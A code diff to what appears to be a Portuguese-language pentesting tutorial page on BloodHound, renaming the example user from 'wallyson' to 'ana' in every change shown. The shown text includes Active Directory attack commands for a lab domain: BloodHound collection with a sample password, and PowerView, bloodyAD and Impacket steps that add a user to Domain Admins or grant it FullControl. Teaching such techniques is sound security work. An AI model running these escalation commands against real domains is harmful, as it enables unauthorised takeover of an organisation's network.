@@ -56,7 +56,7 @@ export default function BloodHound() {
         lines={[
           {
             comment: "do Kali, contra um DC, com credencial válida",
-            cmd: `bloodhound-python -d acme.local -u wallyson -p 'Senha@123' -ns 192.168.50.5 -c All --zip`,
+            cmd: `bloodhound-python -d acme.local -u ana -p 'Senha@123' -ns 192.168.50.5 -c All --zip`,
             out: `INFO: Found AD domain: acme.local
 INFO: Getting TGT for user
 INFO: Connecting to LDAP server: dc01.acme.local
@@ -160,7 +160,7 @@ Status: 18421 objects finished (+982 1097)/s -- Using 178 MB RAM
       />
 
       <OutputBlock label="exemplo de saída — Shortest Path to Domain Admin" type="warning">
-{`     ┌─ 99 wallyson@acme.local ─┐
+{`     ┌─ 99 ana@acme.local ─┐
      │                            │
      ▼  MemberOf                  │
      ┌─ Group: ITSupport ─┐      │
@@ -216,13 +216,13 @@ MATCH p=(g:Group {name:'DOMAIN USERS@ACME.LOCAL'})-[:AdminTo]->(c:Computer) RETU
         lines={[
           {
             comment: "no GUI: clique no node → Mark as Owned (passa a ser laranja)",
-            cmd: "(GUI) right-click 'wallyson@acme.local' → Mark as Owned",
+            cmd: "(GUI) right-click 'ana@acme.local' → Mark as Owned",
             out: "(node fica laranja. agora 'Shortest Path from Owned' encontra paths a partir dele)",
             outType: "info",
           },
           {
             comment: "ou via Cypher",
-            cmd: `MATCH (u:User {name: 'WALLYSON@ACME.LOCAL'}) SET u.owned = true RETURN u`,
+            cmd: `MATCH (u:User {name: 'ANA@ACME.LOCAL'}) SET u.owned = true RETURN u`,
             out: "Updated 1 nodes",
             outType: "default",
           },
@@ -262,15 +262,15 @@ MATCH p=(g:Group {name:'DOMAIN USERS@ACME.LOCAL'})-[:AdminTo]->(c:Computer) RETU
 This edge means user has GenericAll over target.
 
 Abuse with PowerView:
-  Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity 'wallyson' -Rights All
+  Add-DomainObjectAcl -TargetIdentity 'Domain Admins' -PrincipalIdentity 'ana' -Rights All
 
 Abuse with bloodyAD:
-  bloodyAD --host dc01 -d acme.local -u wallyson -p 'Senha@123' \\
-    add groupMember 'Domain Admins' wallyson
+  bloodyAD --host dc01 -d acme.local -u ana -p 'Senha@123' \\
+    add groupMember 'Domain Admins' ana
 
 Abuse with Impacket:
   python3 dacledit.py -action 'write' -rights 'FullControl' \\
-    -principal wallyson -target-dn 'CN=...' acme.local/wallyson:'Senha@123'`,
+    -principal ana -target-dn 'CN=...' acme.local/ana:'Senha@123'`,
             outType: "warning",
           },
         ]}
